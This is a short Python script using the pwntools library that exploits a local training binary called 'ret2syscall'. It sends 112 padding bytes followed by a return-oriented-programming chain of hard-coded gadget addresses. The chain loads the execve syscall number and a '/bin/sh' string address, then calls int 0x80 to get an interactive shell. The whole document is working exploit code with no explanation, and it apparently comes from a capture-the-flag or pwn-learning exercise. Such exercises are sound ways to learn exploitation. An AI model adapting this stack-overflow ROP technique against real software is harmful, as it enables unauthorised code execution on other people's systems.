# !/usr/bin/env python
from pwn import *

sh = process('./ret2syscall')
int_addr = 0x8049421
bin_addr = 0x80be408
pop_other_ret = 0x806eb90
pop_eax_ret = 0x80bb196
payload = b'A' * 112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_other_ret) + p32(0) + p32(0) + p32(bin_addr) + p32(
    int_addr)
sh.sendline(payload)
sh.interactive()
